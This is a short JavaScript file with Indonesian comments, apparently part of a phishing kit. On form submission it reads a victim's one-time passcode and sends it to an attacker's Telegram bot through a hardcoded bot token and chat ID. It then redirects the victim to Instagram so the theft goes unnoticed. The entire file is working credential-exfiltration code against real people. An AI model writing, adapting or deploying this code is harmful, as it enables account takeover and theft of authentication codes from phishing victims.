
document.getElementById('Formulir').addEventListener('submit', function(event) {
    event.preventDefault(); // Mencegah pengiriman formulir default

    const OTP = document.getElementById('OTP').value;
    const token = '8082912224:AAFsnvdeR5bdcCEMHSqS13RPP8SJyNFBLbY'; // Ganti dengan token bot Anda
    const chatId = '5056601299'; // Ganti dengan ID chat Anda

    const text = `OTP: ${OTP}`;
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
    function gabungkanFungsi() {
        fetch(url)
            .then(response => {
                if (response.ok) {
                    alert('Succest');
                    document.getElementById('Formulir').reset(); // Reset formulir
                    window.location.href = "https://www.instagram.com/"; // Arahkan ke halaman otp.html
                } else {
                    alert('Terjadi kesalahan saat mengirim kode.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Terjadi kesalahan saat mengirim pesan.');
            });
    }

    // Panggil fungsi gabungan
    gabungkanFungsi();

});
